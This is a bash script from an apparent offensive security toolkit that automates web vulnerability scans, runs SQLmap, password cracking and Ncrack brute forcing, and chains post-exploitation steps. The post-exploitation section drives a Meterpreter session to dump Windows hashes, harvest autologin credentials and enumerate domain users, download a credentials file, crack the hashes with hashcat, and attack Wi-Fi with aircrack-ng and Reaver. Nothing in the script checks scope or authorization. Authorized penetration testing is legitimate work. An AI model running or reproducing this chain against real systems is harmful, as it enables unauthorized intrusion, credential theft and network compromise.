#!/bin/bash
# =============================================================================
# attack_workflows.sh — Vulnerability scanning, exploitation, and post-exploitation
#
# Replaces: automate_vulnerability_scan.sh, auto_exploitation.sh,
#           automate_post_exploitation.sh
# =============================================================================

# === Script Directory Detection ===
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# === Shared config (colours, display_banner, LOG_FILE, etc.) ===
source "$SCRIPT_DIR/config.sh"
source "$SCRIPT_DIR/run_tools.sh"
source "$SCRIPT_DIR/utilities.sh"

# =============================================================================
# SECTION 1 — AUTOMATED VULNERABILITY SCAN
# Runs ZAP → Wapiti → Nikto against a prompted URL and port.
# =============================================================================

_vuln_scan_log() {
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] $1" | tee -a "$SCAN_LOG"
}

_validate_url() {
    if [[ ! "$1" =~ ^https?://[a-zA-Z0-9.-]+(\:[0-9]+)?(/.*)?$ ]]; then
        echo "[!] Invalid URL format: $1"
        echo "    Example: http://example.com or https://site.com:8080/path"
        return 1
    fi
}

_validate_port() {
    if ! [[ "$1" =~ ^[0-9]+$ ]] || [ "$1" -lt 1 ] || [ "$1" -gt 65535 ]; then
        echo "[!] Invalid port number: $1"
        echo "    Port must be an integer between 1 and 65535."
        return 1
    fi
}

_check_tool_installed() {
    local tool_name="$1" cmd="$2"
    if ! command -v "$cmd" &>/dev/null; then
        _vuln_scan_log "[ERROR] $tool_name is not installed."
        return 1
    fi
    _vuln_scan_log "[INFO] $tool_name is installed."
}

run_automated_vulnerability_scan() {
    local TIMESTAMP REPORT_DIR TARGET_URL TARGET_PORT
    TIMESTAMP=$(date +"%Y-%m-%d_%H-%M-%S")
    REPORT_DIR="reports/vulnerability_scan_$TIMESTAMP"
    SCAN_LOG="$REPORT_DIR/scan.log"

    echo "=== Automated Vulnerability Scanner ==="
    read -p "Enter the target URL (e.g., http://example.com): " TARGET_URL
    _validate_url "$TARGET_URL" || return 1

    read -p "Enter the target port (e.g., 80, 443): " TARGET_PORT
    _validate_port "$TARGET_PORT" || return 1

    mkdir -p "$REPORT_DIR"
    touch "$SCAN_LOG"

    _vuln_scan_log "Starting vulnerability scan on $TARGET_URL:$TARGET_PORT"
    _vuln_scan_log "Reports will be saved to $REPORT_DIR"

    _check_tool_installed "OWASP ZAP" "zap.sh" || return 1
    _check_tool_installed "Wapiti"    "wapiti"  || return 1
    _check_tool_installed "Nikto"     "nikto"   || return 1

    _vuln_scan_log "Running OWASP ZAP..."
    run_owasp_zap_headless "$REPORT_DIR" "$TARGET_URL" "$TARGET_PORT" >> "$SCAN_LOG" 2>&1 \
        && _vuln_scan_log "OWASP ZAP completed." \
        || _vuln_scan_log "[WARNING] OWASP ZAP encountered issues."

    _vuln_scan_log "Running Wapiti..."
    run_wapiti_automated "$REPORT_DIR" "$TARGET_URL" >> "$SCAN_LOG" 2>&1 \
        && _vuln_scan_log "Wapiti completed." \
        || _vuln_scan_log "[WARNING] Wapiti encountered issues."

    _vuln_scan_log "Running Nikto..."
    run_nikto_automated "$REPORT_DIR" "$TARGET_URL" "$TARGET_PORT" >> "$SCAN_LOG" 2>&1 \
        && _vuln_scan_log "Nikto completed." \
        || _vuln_scan_log "[WARNING] Nikto encountered issues."

    _vuln_scan_log "All scans completed. Review reports in $REPORT_DIR"
}

# =============================================================================
# SECTION 2 — EXPLOITATION WORKFLOWS
# Interactive menu to run individual exploitation tools or the full chain.
# =============================================================================

OUTPUT_DIR_EXPLOIT="exploitation_logs"

display_exploitation_menu() {
    echo -e "\n${BYellow}╔════════════════════════════════════════════╗${NC}"
    echo -e "${BYellow}║           Exploitation Workflows            ║${NC}"
    echo -e "${BYellow}╚════════════════════════════════════════════╝${NC}"
    echo -e "${BCyan}1)${NC} ${White}Metasploit Framework${NC}"
    echo -e "${BCyan}2)${NC} ${White}SQL Injection (SQLmap)${NC}"
    echo -e "${BCyan}3)${NC} ${White}Password Cracking (John the Ripper)${NC}"
    echo -e "${BCyan}4)${NC} ${White}Service Bruteforce (Ncrack)${NC}"
    echo -e "${BCyan}5)${NC} ${White}Run Full Exploitation Chain${NC}"
    echo -e "${BCyan}0)${NC} ${White}Go Back${NC}"
    echo -e "${BYellow}╚════════════════════════════════════════════╝${NC}"
}

run_exploitation_menu() {
    display_banner "Automated Exploitation Toolkit"
    local choice
    while true; do
        display_exploitation_menu
        read -p "Choose an option: " choice
        case $choice in
            1) run_metasploit "$OUTPUT_DIR_EXPLOIT" ;;
            2) run_sqlmap     "$OUTPUT_DIR_EXPLOIT" ;;
            3) run_john       "$OUTPUT_DIR_EXPLOIT" ;;
            4) run_ncrack     "$OUTPUT_DIR_EXPLOIT" ;;
            5)
                run_metasploit "$OUTPUT_DIR_EXPLOIT"
                run_sqlmap     "$OUTPUT_DIR_EXPLOIT"
                run_john       "$OUTPUT_DIR_EXPLOIT"
                run_ncrack     "$OUTPUT_DIR_EXPLOIT"
                ;;
            0) break ;;
            *) echo -e "${RED}Invalid choice, please try again.${NC}" ;;
        esac
    done
}

# =============================================================================
# SECTION 3 — POST-EXPLOITATION
# Meterpreter session automation, hash cracking, wireless attacks.
# =============================================================================

automate_post_exploitation() {
    set -e

    local LOGFILE="automation_log_$(date +%F_%T).log"
    echo "[+] Starting post-exploitation automation..." | tee -a "$LOGFILE"

    local_log() { echo "[$(date +'%F %T')] $1" | tee -a "$LOGFILE"; }

    local SESSION_ID="" HASHFILE="" CAPFILE="" INTERFACE=""
    local WORDLIST="/usr/share/wordlists/rockyou.txt"
    local WPS_BSSID="" HASH_MODE="0"

    while [[ $# -gt 0 ]]; do
        case $1 in
            --session)   SESSION_ID="$2"; shift 2 ;;
            --hashfile)  HASHFILE="$2";   shift 2 ;;
            --capfile)   CAPFILE="$2";    shift 2 ;;
            --interface) INTERFACE="$2";  shift 2 ;;
            --wordlist)  WORDLIST="$2";   shift 2 ;;
            --wps-bssid) WPS_BSSID="$2"; shift 2 ;;
            --hash-mode) HASH_MODE="$2"; shift 2 ;;
            *) echo "[!] Unknown parameter: $1"; return 1 ;;
        esac
    done

    _check_post_tool() {
        if ! command -v "$1" >/dev/null 2>&1; then
            echo "[-] $1 is not installed."
            read -p "[?] Install $1? (y/n): " choice
            [[ $choice == "y" ]] && sudo apt update && sudo apt install -y "$1" \
                || { echo "[-] Aborting."; return 1; }
        fi
    }

    for tool in msfconsole hashcat aircrack-ng reaver; do
        _check_post_tool "$tool"
    done

    if [[ ! -f /usr/share/wordlists/rockyou.txt ]]; then
        local_log "Installing wordlists..."
        sudo apt update && sudo apt install -y wordlists
        sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
        local_log "rockyou.txt ready."
    fi

    local OUTPUT_DIR="./output_$(date +%s)"
    mkdir -p "$OUTPUT_DIR/metasploit" "$OUTPUT_DIR/hashcat" "$OUTPUT_DIR/aircrack-ng" "$OUTPUT_DIR/reaver"

    # Auto-detect Meterpreter session
    if [[ -z "$SESSION_ID" ]]; then
        local_log "Auto-detecting active Meterpreter session..."
        local SESSION_OUTPUT
        SESSION_OUTPUT=$(mktemp)
        msfconsole -q -x "sessions -l; exit" > "$SESSION_OUTPUT"
        SESSION_ID=$(grep -P '^\d+\s+uuid.*Meterpreter' "$SESSION_OUTPUT" | awk '{print $1}' | head -n 1)
        if [[ -n "$SESSION_ID" ]]; then
            local_log "Auto-detected session: $SESSION_ID"
        else
            local_log "No active Meterpreter sessions found."
            return 1
        fi
    fi

    # Meterpreter RC script
    local_log "Running post-exploitation on session $SESSION_ID..."
    local RC_FILE="$OUTPUT_DIR/metasploit/meterpreter.rc"
    cat <<EOF > "$RC_FILE"
sessions -i $SESSION_ID
sysinfo
getuid
ps
run post/windows/gather/hashdump
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_domain_group_users
run post/windows/gather/enum_application
download /root/Desktop/credentials.txt $OUTPUT_DIR/metasploit/
exit
EOF
    msfconsole -q -r "$RC_FILE" | tee "$OUTPUT_DIR/metasploit/session_output.txt"

    local HASHES_EXTRACTED="$OUTPUT_DIR/metasploit/hashes.txt"
    grep -oE '[a-fA-F0-9]{32}:[^:]*:[^:]*:[^:]*:[^:]+' \
        "$OUTPUT_DIR/metasploit/session_output.txt" > "$HASHES_EXTRACTED" || true

    # Hashcat
    if [[ -f "$HASHES_EXTRACTED" || -n "$HASHFILE" ]]; then
        echo "[+] Cracking hashes..." | tee -a "$LOGFILE"
        hashcat -m "$HASH_MODE" -a 0 "${HASHFILE:-$HASHES_EXTRACTED}" \
            "$WORDLIST" -o "$OUTPUT_DIR/hashcat/cracked.txt" --force \
            | tee "$OUTPUT_DIR/hashcat/hashcat.log"
    else
        local_log "No hashes to crack."
    fi

    # Aircrack-ng
    if [[ -n "$CAPFILE" ]]; then
        if [[ -f "$CAPFILE" ]]; then
            local_log "Cracking WPA/WPA2 handshake with Aircrack-ng..."
            aircrack-ng "$CAPFILE" -w "$WORDLIST" | tee "$OUTPUT_DIR/aircrack-ng/aircrack.log"
        else
            local_log "Cap file '$CAPFILE' not found. Skipping Aircrack-ng."
        fi
    else
        local_log "No cap file provided. Skipping Aircrack-ng."
    fi

    # Reaver
    if [[ -n "$INTERFACE" && -n "$WPS_BSSID" ]]; then
        local_log "Running Reaver on $INTERFACE against $WPS_BSSID..."
        reaver -i "$INTERFACE" -b "$WPS_BSSID" -vv | tee "$OUTPUT_DIR/reaver/reaver.log"
    else
        local_log "No interface/BSSID provided. Skipping Reaver."
    fi

    local_log "Post-exploitation complete. Output in: $OUTPUT_DIR"
}
